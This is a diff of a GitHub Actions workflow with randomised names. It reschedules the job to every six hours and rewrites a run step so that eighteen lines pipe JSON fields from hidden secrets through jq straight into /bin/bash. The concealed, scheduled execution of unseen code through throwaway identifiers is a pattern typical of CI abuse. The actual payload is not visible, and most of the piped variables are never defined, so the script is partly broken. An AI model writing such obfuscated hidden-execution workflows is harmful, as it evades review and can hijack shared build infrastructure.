@@ -1,9 +1,8 @@
 name: yanfusu1932
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 4/6 * * *'
+    - cron: '22 1/6 * * *'
 
 jobs:
   build:
@@ -12,17 +11,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: yanfusu1932
         env:
-          ibyef4060: ${{ secrets.ibyef4060 }}
+          ovwm700: ${{ secrets.ovwm700 }}
         run: |
-          echo $ibyef4060 | jq -r .v1 | /bin/bash
-          echo $tzt0 | jq -r .t9333 | /bin/bash
-          echo $g850 | jq -r .sybb50 | /bin/bash
-          echo $h40 | jq -r .wcwl80778 | /bin/bash
-          echo $befc0876 | jq -r .smo0 | /bin/bash
-          echo $bm9118 | jq -r .at630 | /bin/bash
-          echo $b03800 | jq -r .g179 | /bin/bash
-          echo $gp0636 | jq -r .oqc01634 | /bin/bash
-          echo $d1936 | jq -r .iyhj54299 | /bin/bash
-          echo $lwtl9210 | jq -r .kop6606 | /bin/bash
-          echo $pn7792 | jq -r .tclmm624 | /bin/bash
+          echo $ovwm700 | jq -r .ccnz555 | /bin/bash
+          echo $tdsmd08 | jq -r .xosbb7 | /bin/bash
+          echo $p233 | jq -r .hon8811 | /bin/bash
+          echo $jln84794 | jq -r .bna11772 | /bin/bash
+          echo $kemc03 | jq -r .aey992 | /bin/bash
+          echo $lq75 | jq -r .yjmrf542 | /bin/bash
+          echo $bcycs600 | jq -r .bdqjo81790 | /bin/bash
+          echo $chzw9 | jq -r .t5176 | /bin/bash
+          echo $mlxx1722 | jq -r .qnl0 | /bin/bash
+          echo $gdyb9821 | jq -r .xv6 | /bin/bash
+          echo $mh2 | jq -r .ku3417 | /bin/bash
+          echo $b4439 | jq -r .zvrti08 | /bin/bash
+          echo $tonb310 | jq -r .byp8 | /bin/bash
+          echo $rda4 | jq -r .wfgec7439 | /bin/bash
+          echo $k341 | jq -r .sqx2 | /bin/bash
+          echo $gyb85168 | jq -r .oedr10354 | /bin/bash
+          echo $wgu3 | jq -r .zvp0310 | /bin/bash
+          echo $qkvsz5420 | jq -r .yr5338 | /bin/bash
 
